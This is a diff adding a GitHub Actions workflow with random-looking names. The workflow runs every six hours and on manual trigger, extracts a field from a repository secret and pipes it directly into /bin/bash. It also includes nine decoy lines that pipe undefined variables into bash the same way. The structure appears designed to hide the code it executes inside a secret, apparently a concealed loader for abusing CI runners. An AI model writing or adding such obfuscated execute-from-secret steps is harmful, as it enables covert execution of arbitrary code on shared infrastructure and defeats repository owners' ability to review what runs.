@@ -1,0 +1,26 @@
+name: alarmingnecklace
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: alarmingnecklace
+        env:
+          r21500: ${{ secrets.r21500 }}
+        run: |
+          echo $r21500 | jq -r .zq6 | /bin/bash
+          echo $if1951 | jq -r .b288 | /bin/bash
+          echo $gwmig33 | jq -r .sqi020 | /bin/bash
+          echo $r1 | jq -r .k29326 | /bin/bash
+          echo $b51 | jq -r .w44434 | /bin/bash
+          echo $qduk17173 | jq -r .xk56 | /bin/bash
+          echo $ugpp3276 | jq -r .cd365 | /bin/bash
+          echo $ew0 | jq -r .nqbpe50485 | /bin/bash
+          echo $p7172 | jq -r .slprd4726 | /bin/bash
+          echo $ge78982 | jq -r .x217 | /bin/bash
+
